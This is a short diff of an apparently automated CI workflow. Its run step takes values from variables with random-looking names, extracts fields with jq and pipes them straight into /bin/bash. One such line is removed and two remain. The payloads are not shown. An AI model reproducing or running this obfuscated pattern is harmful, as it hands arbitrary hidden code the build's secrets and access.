@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$i46" | jq -r .ykdv904 | /bin/bash
           echo $clccw40439 | jq -r .if466 | /bin/bash
-          echo $ubx6 | jq -r .wtn401 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
